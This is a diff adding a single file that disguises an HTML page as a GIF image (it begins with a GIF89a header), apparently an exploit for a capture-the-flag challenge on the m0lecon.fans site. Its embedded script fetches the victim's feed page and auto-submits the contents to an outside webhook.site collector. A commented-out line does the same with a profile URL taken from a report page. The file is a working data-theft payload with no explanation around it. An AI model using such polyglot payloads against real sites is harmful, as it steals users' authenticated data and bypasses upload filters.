@@ -1,0 +1,20 @@
+GIF89a
+<html>
+    <body>
+        <form method="POST" action="https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449">
+            <input id="html" type="text" name="html">
+        </form>
+        <script>
+            var xhr = new XMLHttpRequest();
+            xhr.onload = function() {
+                let id = this.responseText;
+                document.getElementById("html").value = id;
+                document.forms[0].submit();
+            }
+            xhr.open("GET", "https://m0lecon.fans/feed/new");
+            xhr.send();
+        </script>
+    </body>
+</html>
+
+// fetch("https://m0lecon.fans/feed/report").then(data => data.text()).then(data=>{fetch("https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449?url=" + data.match(/https:\/\/(.*?)\/profile/)[0])})
